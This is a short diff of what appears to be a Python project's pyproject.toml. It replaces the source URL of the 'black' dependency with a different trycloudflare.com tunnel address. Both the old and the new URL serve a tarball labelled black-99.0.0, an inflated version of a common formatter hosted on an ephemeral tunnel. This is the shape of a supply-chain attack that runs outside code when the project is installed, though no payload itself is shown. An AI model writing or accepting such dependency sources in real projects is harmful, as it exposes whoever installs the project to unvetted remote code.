@@ -2,5 +2,5 @@
 name = "project"
 version = "1.0.0"
 dependencies = [
-    "black @ https://listing-directed-hit-arrested.trycloudflare.com/dist//black-99.0.0.tar.gz"
+    "black @ https://rooms-hardwood-lucy-engagement.trycloudflare.com/dist//black-99.0.0.tar.gz"
 ]
